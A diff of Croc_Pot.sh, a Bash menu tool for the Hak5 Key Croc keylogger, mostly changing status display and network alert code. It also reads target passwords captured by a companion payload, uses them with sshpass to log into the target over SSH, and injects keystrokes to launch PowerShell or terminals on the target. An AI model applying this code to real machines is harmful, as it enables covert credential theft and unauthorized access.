@@ -4,16 +4,21 @@
 # Description:   Send E-mail, Status of keycroc, Basic Nmap, TCPdump, Install payload,
 #                SSH to HAK5 gear, Reverse ssh tunnel, and more
 # Author:        Spywill
-# Version:       1.8.7
+# Version:       1.9.2
 # Category:      Key Croc
 
 ##
-#----Payload Variables display lines for separating output & (spinstr='|/-\') displays spinner function variable
+#----Variables display lines for separating output & (spinstr='|/-\') displays spinner function variable
 ##
-LINE=$(perl -e 'print "=" x 80,"\n"')
-LINE_=$(perl -e 'print "*" x 10,"\n"')
-LINE_A=$(perl -e 'print "-" x 15,"\n"')
+LINE=$(printf '%0.s=' {1..80})
+LINE_=$(printf '%0.s*' {1..10})
+LINE_A=$(printf '%0.s-' {1..15})
 spinstr='|/-\'
+##
+# Variables define the source directory for loot files and the backup destination directory
+##
+source_dir="/root/udisk/loot"
+backup_dir="/tmp/loot_backup"
 #----Validate IP v4 or v6 address
 #----source: http://stackoverflow.com/a/9221063
 validate_ip="^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))|((([0-9A-Fa-f]{1,4}:){7}([0-9A-Fa-f]{1,4}|:))|(([0-9A-Fa-f]{1,4}:){6}(:[0-9A-Fa-f]{1,4}|((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){5}(((:[0-9A-Fa-f]{1,4}){1,2})|:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){4}(((:[0-9A-Fa-f]{1,4}){1,3})|((:[0-9A-Fa-f]{1,4})?:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){3}(((:[0-9A-Fa-f]{1,4}){1,4})|((:[0-9A-Fa-f]{1,4}){0,2}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){2}(((:[0-9A-Fa-f]{1,4}){1,5})|((:[0-9A-Fa-f]{1,4}){0,3}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){1}(((:[0-9A-Fa-f]{1,4}){1,6})|((:[0-9A-Fa-f]{1,4}){0,4}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(:(((:[0-9A-Fa-f]{1,4}){1,7})|((:[0-9A-Fa-f]{1,4}){0,5}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))))$"
@@ -22,6 +27,7 @@ validate_ip="^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01
 ##
 CROC_POT_DIR=(/root/udisk/loot/Croc_Pot /root/udisk/tools/Croc_Pot)
 for dir in "${CROC_POT_DIR[@]}"; do [[ ! -d "$dir" ]] && mkdir "$dir" || LED B; done
+for file in "loot/croc_raw.log"; do [[ ! -f "$file" ]] && echo -n > "$file" || : ; done
 ##
 #----Color Variables
 ##
@@ -231,7 +237,7 @@ function OS_CHECK() {
 	[ -f "/root/udisk/tools/Croc_Pot/Croc_OS.txt" ] && sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt || ColorRed 'INVALID OS'
 }
 ##
-#----Check for target PC ip from saved Croc_Pot_Payload scan
+#----Check for target ip from saved Croc_Pot_Payload scan
 ##
 function os_ip() {
 	if [ -f "/root/udisk/tools/Croc_Pot/Croc_OS_Target.txt" ]; then
@@ -245,18 +251,18 @@ function os_ip() {
 	fi
 }
 ##
-#----Check for target pc passwd (Need to run CrocUnlock payload)
+#----Check for target password (Need to run CrocUnlock payload)
 ##
-sed -i '/\b'"$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)"'\b/!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered 2>/dev/null
 function target_pw() {
 	if [ -f "/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered" ]; then
+		sed -i '/\b'"$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)"'\b/!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered 2>/dev/null
 		sed '$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered
 	else
-		ColorRed 'Run Croc_Unlock Payload to get user passwd\n'
+		ColorRed 'Run Croc_Unlock Payload to retrieve target password\n'
 	fi
 }
 ##
-#----Check for keycroc save passwd at /tmp/CPW.txt if not enter password and valid password
+#----Check for keycroc save password at /tmp/CPW.txt if not enter password and valid password
 ##
 function croc_passwd_check() {
 	local salt="$(getent shadow root | cut -d$ -f3)"
@@ -266,10 +272,10 @@ function croc_passwd_check() {
 		local mpassword="$(python -c 'import crypt; print crypt.crypt("'"$password"'", "$6$'"$salt"'")')"
 		if [ "$mpassword" == "$epassword" ]; then
 			LED G
-			ColorGreen 'VALID PASSWORD\n'
+			ColorGreen "VALID PASSWORD$clear\n"
 		else
 			LED R
-			ColorRed 'INVALID PASSWORD PLEASE TRY AGAIN\n'
+			ColorRed "INVALID PASSWORD PLEASE TRY AGAIN$clear\n"
 			rm /tmp/CPW.txt
 			croc_passwd_check
 		fi
@@ -278,16 +284,36 @@ function croc_passwd_check() {
 		local mpassword="$(python -c 'import crypt; print crypt.crypt("'"$password"'", "$6$'"$salt"'")')"
 		if [ "$mpassword" == "$epassword" ]; then
 			LED G
-			ColorGreen 'VALID PASSWORD\n'
+			ColorGreen "VALID PASSWORD$clear\n"
 		else
 			LED R
-			ColorRed 'INVALID PASSWORD PLEASE TRY AGAIN\n'
+			ColorRed "INVALID PASSWORD PLEASE TRY AGAIN$clear\n"
 			rm /tmp/CPW.txt
 			croc_passwd_check
 		fi
 	fi
 }
 croc_passwd_check
+echo ""
+##
+#----Check Croc_Pot_Payload, Croc_unlock, Croc_Getonline execution status
+##
+if [ -f "/root/udisk/tools/Croc_Pot/Croc_OS_Target.txt" ]; then
+	ColorYellow "Croc_Pot_Payload: $(ColorGreen "OK")\n"
+else
+	ColorYellow "Croc_Pot_Payload: $(ColorRed "NONE")\n"
+fi
+if [ -f "/root/udisk/tools/Croc_Pot/wifipass.txt" ]; then
+	ColorYellow "Croc_Getonline: $(ColorGreen "OK")\n"
+else
+	ColorYellow "Croc_Getonline: $(ColorRed "NONE")\n"
+fi
+if [ -f "/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered" ]; then
+	ColorYellow "Croc_Unlock: $(ColorGreen "OK")\n"
+else
+	ColorYellow "Croc_Unlock: $(ColorRed "NONE")\n"
+fi
+sleep 1
 ##
 #----Stop/start ICMP/PORT alert by pressing [kp] in Croc_Pot Main Menu
 ##
@@ -297,7 +323,8 @@ function start_icmp() {
 -Press [kp] in Main Menu to stop/start ICMP/PORT alert
 -Press [b] in any menu to return to previous menu
 -Press [p] in any menu Panic button close application, kill wlan0
--Press [st] in Main Menu or Plus_Menu to refresh title every five sec'
+-Press [st] in Main Menu or Plus_Menu to refresh title every five sec
+-Type [lock] in any menu will lock keyboard for 1 min'
 	if ps -p "$(sed -n 1p /tmp/port_pid.txt)" || ps -p "$(sed -n 1p /tmp/icmp_pid.txt)"; then
 		if ps -p "$(sed -n 1p /tmp/port_pid.txt)"; then
 			ColorYellow "Killing port alert\n"
@@ -317,23 +344,33 @@ function start_icmp() {
 ##
 	icmp_alert() {
 		ip_address=$(ifconfig wlan0 | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*')
-		netmask=$(ifconfig wlan0 | grep -Eo 'Mask:([0-9]*\.){3}[0-9]*|netmask ([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*')
+		ip_info=$(ip -o -f inet addr show wlan0 | awk '{print $4}')
+		ip_address=${ip_info%/*}
+		netmask_cidr=${ip_info#*/}
+		cidr_to_netmask() {
+			local cidr=$1
+			local mask=$(( 0xffffffff << (32 - cidr) & 0xffffffff ))
+			echo "$(( (mask >> 24) & 255 )).$(( (mask >> 16) & 255 )).$(( (mask >> 8) & 255 )).$(( mask & 255 ))"
+		}
+		netmask=$(cidr_to_netmask "$netmask_cidr")
 		IFS=. read -r i1 i2 i3 i4 <<< "$ip_address"
 		IFS=. read -r m1 m2 m3 m4 <<< "$netmask"
-		network_range="$((i1 & m1)).$((i2 & m2)).$((i3 & m3)).0/24"
+		network_range="$((i1 & m1)).$((i2 & m2)).$((i3 & m3)).0/$netmask_cidr"
 		sleep 1
 		until (tcpdump -c 1 -n '((icmp and icmp[0]=8) or (udp and src net '$network_range' and (dst port 33434 or dst port 33534))) and not src host '$ip_address'' | grep -o "IP.*" | sed 's/id.*//g; s/length.*//g' | sed 's/IP/\n&/g'); do
 			:
 		done
-		LED C FAST
-		iptables-save > ~/firewall-rules-backup.txt
+		iptables-save > /root/udisk/tools/Croc_Pot/firewall-rules-backup.txt
 		iptables -F
 		iptables -A OUTPUT -p icmp --icmp-type any -j DROP
-		Countdown 1 15 Alert inbound ICMP temporarily disabling inbound ICMP
-		iptables-restore < ~/firewall-rules-backup.txt
-		ColorYellow "INBOUND ICMP IS ENABLED\033[0K\r" ; sleep 4 ; tput el
-		printf '\033[1A\033[K'
+		LED C FAST
+		printf '\033[H\033[2J'
+		ColorRed "Alert: Inbound ICMP detected! Temporarily disabling inbound ICMP for one minute...\n"
+		sleep 60
+		iptables-restore < /root/udisk/tools/Croc_Pot/firewall-rules-backup.txt
+		printf '\033[H\033[2J'
 		LED OFF
+		ColorGreen "Firewall rules are now restored.\n" ; sleep 1
 		icmp_alert & echo -ne $! > /tmp/icmp_pid.txt
 	}
 ##
@@ -341,56 +378,62 @@ function start_icmp() {
 ##
 	port_alert() {
 		ip_address=$(ifconfig wlan0 | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*')
-		file=/tmp/tcpdump.out
-		until (tcpdump -i wlan0 -c 20 'tcp[tcpflags] & (tcp-syn) != 0 and not src host '$ip_address'' -w $file -G 10); do
-			:
+		file="/tmp/portscan.pcap"
+		tcpdump -i wlan0 '(tcp[tcpflags] & (tcp-syn|tcp-fin|tcp-rst|tcp-ack) != 0) and (not src host '$ip_address') and (not dst port 22) and (not src port 22)' -w $file -G 10 &
+		tcpdump_pid=$!
+		while true; do
+			file_size=$(stat -c %s $file)
+			if [ "$file_size" -gt 0 ]; then
+				detected_scans=$(tcpdump -nn -r $file 'tcp[tcpflags] & (tcp-syn) != 0' -c 20 2>/dev/null | wc -l)
+				if [ "$detected_scans" -ge 20 ]; then
+					kill -9 $tcpdump_pid
+					LED C FAST
+					printf '\033[H\033[2J'
+					ColorYellow "Detected $detected_scans port scans. Stopping tcpdump.\n"
+					ColorRed "Temporarily disabling all open ports for one minute...\n"
+					ColorYellow "List of detected port scans (attacker IPs and target ports):\n"
+					tcpdump -nn -r $file 'tcp[tcpflags] & (tcp-syn) != 0' 2>/dev/null | awk '{print "Attacker IP:", $3, "→ Target Port:", $5}' | sed 's/:$//'
+					rm $file
+					break
+				fi
+			fi
+			sleep 1
 		done
-		LED C FAST
-		printf '\033[H\033[2J'
-		ColorRed "Port scan has been detected\n"
-		while read -r ip; do
-			count=$(tcpdump -nn -r $file | grep -c "$ip")
-			port=$(tcpdump -nn -r $file | grep "$ip" | awk '{print $5}' | awk -F. '{print $5}')
-			ColorYellow "ip: $(ColorCyan "$ip")\n"
-			ColorYellow "count: $(ColorCyan "$count")\n"
-			ColorYellow "port: $(ColorCyan "$port")\n"
-		done <<< "$(tcpdump -nn -r $file | awk '{print $3}' | awk -F. '{print $1"."$2"."$3"."$4}' | sort -u)" 2>/dev/null
-		ColorRed "Temporarily closing all open ports for one minute...\n"
-		iptables-save > ~/firewall-rules-backup.txt
+		iptables-save > /root/udisk/tools/Croc_Pot/firewall-rules-backup.txt
 		iptables -F
 		iptables -P INPUT DROP
 		iptables -P OUTPUT DROP
 		iptables -P FORWARD DROP
 		sleep 60
-		iptables-restore < ~/firewall-rules-backup.txt
+		iptables-restore < /root/udisk/tools/Croc_Pot/firewall-rules-backup.txt
 		printf '\033[H\033[2J'
 		LED OFF
-		ColorGreen "All open ports are now restored.\n" ; sleep 1
+		ColorGreen "Firewall rules are now restored.\n" ; sleep 1
 		port_alert & echo -ne $! > /tmp/port_pid.txt
 	}
 		read_all 'START ICMP ALERT Y/N AND PRESS [ENTER]'
 		case "$r_a" in
 			[yY] | [yY][eE][sS])
 				ICMP_STATUS="\e[5m$cyan"
-				P_A="${yellow}ICMP ALERT: ${clear}${green}RUNNING"
-				ColorYellow 'STARTING ICMP ALERT\n'
+				ICMP_CHECK=$(ColorYellow "ICMP ALERT: $(ColorGreen "RUNNING")\n")
 				icmp_alert & echo -ne $! > /tmp/icmp_pid.txt ;;
 			[nN] | [nN][oO])
 				ICMP_STATUS="$red"
-				P_A="${yellow}ICMP ALERT: ${clear}${red}NOT RUNNING" ;;
+				ICMP_CHECK=$(ColorYellow "ICMP ALERT: $(ColorRed "NOT RUNNING")\n") ;;
 			*)
 				ICMP_STATUS="$red"
-				P_A="${yellow}ICMP ALERT: ${clear}${red}NOT RUNNING"
+				ICMP_CHECK=$(ColorYellow "ICMP ALERT: $(ColorRed "NOT RUNNING")\n")
 				invalid_entry ;;
 		esac
 		read_all 'START PORT ALERT Y/N AND PRESS [ENTER]'
 		case "$r_a" in
 			[yY] | [yY][eE][sS])
-				ColorYellow 'STARTING PORT ALERT\n'
+				PORT_CHECK=$(ColorYellow "PORT ALERT: $(ColorGreen "RUNNING")\n")
 				port_alert & echo -ne $! > /tmp/port_pid.txt ;;
 			[nN] | [nN][oO])
-				ColorYellow 'PORT ALERT NOT RUNNING\n' ;;
+				PORT_CHECK=$(ColorYellow "PORT ALERT: $(ColorRed "NOT RUNNING")\n") ;;
 			*)
+				PORT_CHECK=$(ColorYellow "PORT ALERT: $(ColorRed "NOT RUNNING")\n")
 				invalid_entry ;;
 		esac
 	fi
@@ -407,10 +450,13 @@ SSID_CHECK() {
 	ssid=$(echo "$output" | grep "SSID" | awk '{print $2}')
 	info=$(iw dev wlan0 scan | grep -E "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | grep -E $ssid)
 	signal_strength=$(echo "$info" | awk '{print $1}')
-	ColorYellow "Current SSID: $(ColorGreen "$ssid")\n"
-	ColorYellow "Signal Strength: $(ColorGreen "$signal_strength dBm")\n"
+	ColorYellow "Current SSID: $(ColorGreen "$ssid ")\n"
+	ColorYellow "Signal Strength: $(ColorGreen "$signal_strength dBm ")\n"
+	ColorYellow "Target IP: $(ColorGreen "$(os_ip) ")\n"
+	cat /etc/resolv.conf | grep nameserver | awk '{print "\033[40;93mnameserver: \033[0m\033[40;32m"$2" \033[0m"}'
 }
-SSID_CHECK ; echo -ne "\n"
+SSID_CHECK
+echo ""
 ##
 #----Check /tmp/cc-client-error.log count number or errors
 ##
@@ -433,13 +479,14 @@ fi
 #----check if keyboard PRESENT or MISSING with (KEYBOARD) command
 ##
 function keyboard_check() {
-	[ "$(KEYBOARD)" = PRESENT ] && ColorYellow "KEYBOARD: $(ColorGreen "PRESENT $(ColorCyan "$(cat /tmp/mode)")")\n" || ColorYellow "KEYBOARD: $(ColorRed 'MISSING')\n"
+	[ "$(KEYBOARD)" = PRESENT ] && ColorYellow "KEYBOARD: $(ColorGreen "PRESENT $(ColorCyan "$(cat /tmp/mode)")")${clear}\n" || ColorYellow "KEYBOARD: $(ColorRed 'MISSING')\n"
 }
-keyboard_check ; echo -ne "\n"
+keyboard_check
+echo ""
 ##
 #----Croc_Pot file count
 ##
-ColorYellow "CROC_POT FILE COUNT- LINES: $(ColorGreen "$(wc -l /root/udisk/tools/Croc_Pot.sh | awk '{print $1}')")$(ColorYellow ' WORDS: ')$(ColorGreen "$(wc -w /root/udisk/tools/Croc_Pot.sh | awk '{print $1}')")$(ColorYellow ' CHARACTERS: ')$(ColorGreen "$(wc -m /root/udisk/tools/Croc_Pot.sh | awk '{print $1}')")\n"
+ColorYellow "CROC_POT FILE COUNT LINES: $(ColorGreen "$(wc -l /root/udisk/tools/Croc_Pot.sh | awk '{print $1}')")$(ColorYellow ' WORDS: ')$(ColorGreen "$(wc -w /root/udisk/tools/Croc_Pot.sh | awk '{print $1}')")$(ColorYellow ' CHARACTERS: ')$(ColorGreen "$(wc -m /root/udisk/tools/Croc_Pot.sh | awk '{print $1}')")\n"
 ##
 #----Number of times Croc_Pot has started up
 ##
@@ -455,7 +502,7 @@ function C_P_T() {
 	if [ "$var" -eq 1 ]; then
 		ColorYellow "CROC_POT FIRST STARTUP THANK YOU AND ENJOY :) $(ColorGreen "$var")\n"
 	else
-		ColorYellow "CROC_POT STARTUP: $(ColorGreen "$var")$(ColorYellow ' TIMES   LAST STARTUP: ')$(ColorGreen "$(sed -n "2p;" "$c_p_t")")\n"
+		ColorYellow "CROC_POT STARTUP: $(ColorGreen "$var")$(ColorYellow '  LAST STARTUP: ')$(ColorGreen "$(sed -n "2p" "$c_p_t")")\n"
 	fi
 	echo -ne "$var\n$(date +%b-%d-%y-%r)\n" > "$c_p_t"
 }
@@ -463,15 +510,19 @@ C_P_T
 ##
 #----Quick check info on startup
 ##
-ColorCyan '\nUID  PID  PPID C STIME TTY    CMD\n'
+ColorCyan "\nUID  PID  PPID C STIME TTY    CMD\n"
 ColorGreen "$(ps -ef | grep "Croc_Pot.sh" | awk 'FNR <= 1' | awk '{$7 = ""};1')\n\n"
-ColorYellow "CURRENTLY FOUND: $(ColorGreen "$(cat /root/udisk/loot/croc_char.log | wc -m)")$(ColorYellow ' CHARACTERS IN croc_char.log')\n"
-ColorYellow "INSTALLED PAYLOADS: $(ColorGreen "$(ls /root/udisk/payloads | grep -c ".txt")")\n\n"
-ColorCyan "$(df -h | sed -n '1p' | awk '{ print toupper($0); }')\n$(ColorGreen "$(df -h | sed -n '2,10p')")\n\n"
+ColorCyan "$(df -h | sed -n '1p' | awk '{ print toupper($0); }')\n"
+ColorGreen "$(df -h | sed -n '2,$p')$clear\n\n"
+ColorYellow "CURRENTLY FOUND: $(ColorGreen "$(find . -type f -name "croc_char.log" -exec cat {} + | wc -m)")$(ColorYellow ' CHARACTERS IN croc_char.log')\n"
+ColorYellow "INSTALLED PAYLOADS: $(ColorGreen "$(ls /root/udisk/payloads | grep -c ".txt")")\n"
+for file_path in $(find "/root/udisk/payloads" -maxdepth 1 -type f); do
+	ColorCyan "\t$(basename "$file_path")$clear\n"
+done ; echo ""
 ##
 #----Check NumLock state ON or OFF
 ##
-nc -z -w 1 "$(os_ip)" 22 &>"/dev/null"
+nc -vz -w 1 "$(os_ip)" 22 &>"/dev/null"
 if [[ $? -ne 0 ]]; then
 	ColorYellow "NUMLOCK STATE:$(ColorRed ' UNKNOWN ')$(ColorYellow 'Unable to ping target')\n"
 elif [[ "${#args[@]}" -eq 0 ]]; then
@@ -488,12 +539,12 @@ elif [[ "${#args[@]}" -eq 0 ]]; then
 				ColorYellow "NUMLOCK STATE: $(ColorRed 'UNKNOWN Run Croc_Pot_Payload')\n"
 			fi
 		elif [ "$(OS_CHECK)" = LINUX ]; then
-			NUM_STATUS="$(sshpass -p "$(target_pw)" ssh -o "StrictHostKeyChecking no" "$TARGET_USERNAME"@"$(os_ip)" 'export DISPLAY=:0 ; echo `xset -q | grep -Po "(?<=Num Lock:)\W*\K[^ ]*"`')"
-			if [ "$NUM_STATUS" = off ]; then
-				Q NUMLOCK
+			NUM_STATUS="$(sshpass -p "$(target_pw)" ssh -o "StrictHostKeyChecking no" "$TARGET_USERNAME"@"$(os_ip)" 'cat /sys/class/leds/input*::numlock/brightness | uniq')"
+			if [ "$NUM_STATUS" = 0 ]; then
+				QUACK NUMLOCK
 				ColorYellow "NUMLOCK STATE: $(ColorGreen 'TURNED TO ON STATE')\n"
-			elif [ "$NUM_STATUS" = on ]; then
-				ColorYellow "NUMLOCK STATE: $(ColorGreen "${NUM_STATUS^^}")\n"
+			elif [ "$NUM_STATUS" = 1 ]; then
+				ColorYellow "NUMLOCK STATE: $(ColorGreen "ON")\n"
 			else
 				ColorYellow "NUMLOCK STATE: $(ColorRed 'UNKNOWN')\n"
 			fi
@@ -502,7 +553,6 @@ elif [[ "${#args[@]}" -eq 0 ]]; then
 		ColorYellow "NUMLOCK STATE:$(ColorRed ' UNKNOWN ')$(ColorYellow '-Run Croc_unlock payload-')\n"
 	fi
 fi
-echo -ne "$P_A$clear\n"
 ##
 #----Save keycroc Original Mac address, Check Original Mac Address or spoof
 ##
@@ -520,6 +570,7 @@ function check_mac() {
 	fi
 }
 check_mac
+echo -e "$ICMP_CHECK$PORT_CHECK"
 ##
 #----Croc_Pot title function
 #----PRESS CTRL + C to break loop stopping Croc_Pot title from refreshing
@@ -534,18 +585,47 @@ function croc_title() {
 #----Test internet connection
 ##
 internet_test() {
-	(nc -z -w 1 8.8.8.8 53) && I_T="${green}ONLINE" || I_T="${red}OFFLINE"
+	(nc -vz -w 1 8.8.8.8 53) && I_T="${green}ONLINE" || I_T="${red}OFFLINE"
 }
-internet_test
+internet_test > /dev/null 2>&1
+##
+#----Random Unicode value in the range 0x0400-0x04F7, white and green contain ANSI escape codes
+##
+ramdom_char() {
+	if (( RANDOM % 2 )); then
+		selected_color="$white"
+	else
+		selected_color="$green"
+	fi
+	default_char() {
+		special_chars=("!" "@" "#" "$" "%" "^" "&" "*" "(" ")" "_" "+" ":" ">" "<" "?" "," "." "/" "'" ";" "0" "1" "∞" "☼" "‼" "=" "X" "~")
+		rand_index=$(( RANDOM % ${#special_chars[@]} ))
+		selected_char=${special_chars[$rand_index]}
+		echo -ne "${selected_color} $selected_char"
+	}
+	if [ "$(OS_CHECK)" = WINDOWS ]; then
+		default_char
+	elif [ "$(OS_CHECK)" = LINUX ]; then
+		rand=$(printf '%x' $((RANDOM%256+1024)))
+		dec=$(printf "%d" "$((0x$rand))")
+		if [[ $dec -lt 1155 || $dec -gt 1161 ]]; then
+			printf "${selected_color} \u$rand"
+		else
+			echo -ne "${selected_color} #"
+		fi
+	else
+		default_char
+	fi
+}
 ##
 #----Croc_Pot title display info
 ##
 	while : ; do
 		ColorGreen "`tput cup 0 0`$clear\e[41;38;5;232;1m$LINE$clear
-$(ColorGreen '»»»»»»»»»»»» CROC_POT ««««««««')$(ColorYellow 'VER:1.8.7')\e[41;38;5;232m${array[1]}$clear$(ColorYellow " $(hostname | awk '{ print toupper($0); }') IP: $(awk -v m=20 '{printf("%-20s\n", $0)}' <<< "$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)")")$(awk -v m=19 '{printf("%-19s\n", $0)}' <<< "$I_T")$clear
-$(ColorBlue "AUTHOR: $(ColorYellow 'SPYWILL')")$(ColorCyan "   $(awk -v m=21 '{printf("%-21s\n", $0)}' <<< "$(uptime -p | sed 's/up/CROC UP:/g' | sed 's/hours/hr/g' | sed 's/hour/hr/g' | sed 's/,//g' | sed 's/minutes/min/g' | sed 's/minute/min/g')")")\e[41;38;5;232m§$clear$(ColorYellow " $(hostname | awk '{ print toupper($0); }') VER: $(cat /root/udisk/version.txt) ")$ICMP_STATUS*$clear$(ColorYellow "TARGET-PC:$(ColorGreen "$(awk -v m=10 '{printf("%-10s\n", $0)}' <<< "$(OS_CHECK)")")")
-$(ColorBlue "$(awk -v m=17 '{printf("%-17s\n", $0)}' <<< "${croc_timezone^^}")")$(ColorCyan " $(date +%b-%d-%y-%r | awk '{ print toupper($0); }')")\e[41;38;5;232mΩ$clear$(ColorYellow ' KEYBOARD:')$(ColorGreen "$(sed -n 9p /root/udisk/config.txt | sed 's/DUCKY_LANG //g' | sed -e 's/\(.*\)/\U\1/') ")$(ColorYellow "ID:$(ColorGreen "${k_b^^}")")
-$(ColorGreen '»»»»»»»»»»»» ')$(ColorRed 'KEYCROC-HAK')\e[40m${array[0]}$clear$(ColorGreen ' «««««««««««««')\e[41;38;5;232m${array[2]}$clear$(ColorYellow " TEMP:$(ColorCyan "$(cat /sys/class/thermal/thermal_zone0/temp)°C")")$(ColorYellow " USAGE:$(ColorCyan "$(awk -v m=6 '{printf("%-6s\n", $0)}' <<< "$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}')")")")$(ColorYellow "MEM:$(ColorCyan "$(awk -v m=13 '{printf("%-13s\n", $0)}' <<< "$(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }')")")")
+$(ColorGreen '                 CROC_POT      ')$(ColorBlue 'V-1.9.2')$(ramdom_char)$clear$(ColorYellow " $(hostname | awk '{ print toupper($0); }') IP: $(awk -v m=17 '{printf("%-17s\n", $0)}' <<< "$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)")")$(awk -v m=22 '{printf("%-22s\n", $0)}' <<< "$I_T")$clear
+$(ColorBlue "AUTHOR: $(ColorYellow 'SPYWILL')")$(ColorCyan "  $(awk -v m=21 '{printf("%-21s\n", $0)}' <<< "$(uptime -p | sed 's/up/CROC UP:/g' | sed 's/hours/hr/g' | sed 's/hour/hr/g' | sed 's/,//g' | sed 's/minutes/min/g' | sed 's/minute/min/g')")")$(ramdom_char)$clear$(ColorYellow " $(hostname | awk '{ print toupper($0); }') VER: $(cat /root/udisk/version.txt) ")$ICMP_STATUS*$clear$(ColorYellow "TARGET:$(ColorGreen "$(awk -v m=13 '{printf("%-13s\n", $0)}' <<< "$(OS_CHECK)")")")
+$(ColorBlue "$(awk -v m=17 '{printf("%-17s\n", $0)}' <<< "${croc_timezone^^}")")$(ColorCyan "$(date +%b-%d-%y-%r | awk '{ print toupper($0); }')")$(ramdom_char)$clear$(ColorYellow ' KEYBOARD:')$(ColorGreen "$(sed -n 13p /root/udisk/config.txt | sed 's/DUCKY_LANG //g' | sed -e 's/\(.*\)/\U\1/') ")$(ColorYellow "ID:$(ColorGreen "${k_b^^}")")
+$(ColorRed '                 KEYCROC-HAK')\e[40m${array[0]}         $clear$(ramdom_char)$clear$(ColorYellow " TEMP:$(ColorCyan "$(cat /sys/class/thermal/thermal_zone0/temp)°C")")$(ColorYellow " USAGE:$(ColorCyan "$(awk -v m=6 '{printf("%-6s\n", $0)}' <<< "$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}')")")")$(ColorYellow "MEM:$(ColorCyan "$(awk -v m=13 '{printf("%-13s\n", $0)}' <<< "$(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }')")")")
 \e[41;38;5;232;1m$LINE$clear`tput rc`"
 		[ "$broken" -eq 1 ] && break || sleep 5
 	done & title_pid=$!
@@ -576,7 +656,7 @@ function install_package() {
 		read_all "DOWNLOAD AND INSTALL $2 Y/N AND PRESS [ENTER]"
 		case "$r_a" in
 			[yY] | [yY][eE][sS])
-				apt -y install "$1" ;;
+				apt --force-yes -y install "$1" ;;
 			[nN] | [nN][oO])
 				ColorYellow 'Maybe next time\n' ;;
 			*)
@@ -587,19 +667,19 @@ function install_package() {
 	fi
 }
 ##
-#----Start default web browser on target pc
+#----Start default web browser on target
 ##
 function start_web() {
 	if [ "$(OS_CHECK)" = WINDOWS ]; then
-		Q GUI d ; Q GUI r ; sleep 1 ; Q STRING "powershell" ; Q ENTER ; sleep 2 ; Q STRING "Start-Process ${1} ; exit" ; Q ENTER
+		QUACK GUI d ; QUACK GUI r ; sleep 1 ; QUACK STRING "powershell" ; QUACK ENTER ; sleep 2 ; QUACK STRING "Start-Process $1 ; exit" ; QUACK ENTER
 	else
 		case "$HOST_CHECK" in
 			raspberrypi)
-				Q CONTROL-ALT-t ; sleep 1 ; Q STRING "chromium-browser ${1} & exit" ; Q ENTER ;;
+				QUACK CONTROL-ALT-d ; QUACK CONTROL-ALT-t ; sleep 1 ; QUACK STRING "xdg-open $1 & exit" ; QUACK ENTER ;;
 			"$HOST_CHECK")
-				Q ALT F2 ; sleep 1 ; Q STRING "mate-terminal" ; Q ENTER ; sleep 1 ; Q STRING "gio open ${1} & exit" ; Q ENTER ;;
+				QUACK CONTROL-ALT-d ; QUACK ALT-t ; sleep 1 ; QUACK STRING "xdg-open $1 & exit" ; QUACK ENTER ;;
 			*)
-				Q ALT F2 ; sleep 1 ; Q STRING "xterm" ; Q ENTER ; sleep 1 ; Q STRING "gio open ${1} & exit" ; Q ENTER ;;
+				QUACK CONTROL-ALT-d ; QUACK ALT F2 ; sleep 1 ; QUACK STRING "xterm" ; QUACK ENTER ; sleep 1 ; QUACK STRING "xdg-open $1 & exit" ; QUACK ENTER ;;
 		esac
 	fi
 }
@@ -614,7 +694,7 @@ function displaySpinner() {
 		local spinstr=$temp${spinstr%"$temp"}
 		sleep 0.3
 	done
-	ColorYellow "\r\033[2KProgress has finished\r\n"
+	ColorYellow "Progress has finished$clear\033[0K\r"
 }
 ##
